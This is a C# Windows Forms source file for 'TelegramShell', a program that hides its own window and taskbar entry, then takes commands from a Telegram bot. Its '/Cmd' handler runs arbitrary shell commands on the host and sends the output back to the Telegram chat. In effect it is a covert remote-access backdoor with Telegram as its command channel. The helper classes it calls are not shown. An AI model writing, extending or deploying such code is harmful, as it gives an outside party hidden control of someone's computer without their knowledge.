using System;
using System.Linq;
using System.Windows.Forms;
using Telegram.Bot.Args;

namespace TelegramShell
{
    public partial class TelegramShell : Form
    {
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Opacity = 0;
            base.OnLoad(e);
        }

        private TelegramAPI _api;
        private Command _command;
        private ListOfCommands _listOfCommands;
        private CMD _cmd;
        
        public TelegramShell()
        {
            InitializeComponent();
            _api = new TelegramAPI();
            _api.Client.StartReceiving();
            _api.Client.OnMessage += OnMessageHandler;
        }
        
        private void OnMessageHandler(object sender, MessageEventArgs e)
        {
            _command = new Command(e.Message.Text);

            switch (_command.GetCommand())
            {
                case Commands.Show:
                    _listOfCommands = new ListOfCommands();
                    _api.Client.SendTextMessageAsync(e.Message.Chat.Id, _listOfCommands.Show());
                    break;
                    
                case Commands.Cmd:
                    _cmd = new CMD(_command.GetParameters());
                    _api.Client.SendTextMessageAsync(e.Message.Chat.Id, _cmd.Execute().Result);
                    break;

                case Commands.Chat:
                    _api.Client.StopReceiving();
                    
                    Chat chat = new Chat(
                       mainApi: _api,
                       nickName: _command.GetParameters().Count > 0 ?
                           _command.GetParameters().First() :
                           "Unknown"
                        );
                    Application.Run(chat);
                    break;
                
                case Commands.QuitChat:
                    _api.Client.SendTextMessageAsync(e.Message.Chat.Id,
                        "There's no chat initializated.");
                    break;
                
                case Commands.NotValidCommand:
                    _api.Client.SendTextMessageAsync(e.Message.Chat.Id, 
                        "Not a valid command. Tap /Show to show the list of commands.");
                    break;
            }
        }
        
        private void TelegramShell_Load(object sender, EventArgs e)
        {

        }
    }
}
